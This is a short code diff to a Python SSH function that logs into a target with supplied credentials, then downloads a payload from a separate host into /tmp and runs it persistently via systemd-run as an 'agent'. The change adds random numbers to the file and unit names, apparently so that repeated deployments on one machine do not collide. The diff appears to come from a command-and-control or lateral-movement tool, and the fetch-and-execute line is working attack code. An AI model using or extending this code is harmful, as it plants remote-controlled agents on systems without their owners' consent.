@@ -58,7 +58,8 @@ def ssh(username, password, target, FLASK_HOST, FLASK_PORT):
         print("Connection successful!")
 
         # Run a command
-        command = f"curl -s http://{FLASK_HOST}:{FLASK_PORT}/static/lin > /tmp/agent;systemd-run --unit=agent bash /tmp/agent"
+        rnum = random.randint(1, 1000)
+        command = f"curl -s http://{FLASK_HOST}:{FLASK_PORT}/static/lin > /tmp/agent{rnum};systemd-run --unit=agent{rnum} bash /tmp/agent{rnum}"
         stdin, stdout, stderr = client.exec_command(command)
 
         # Close the connection
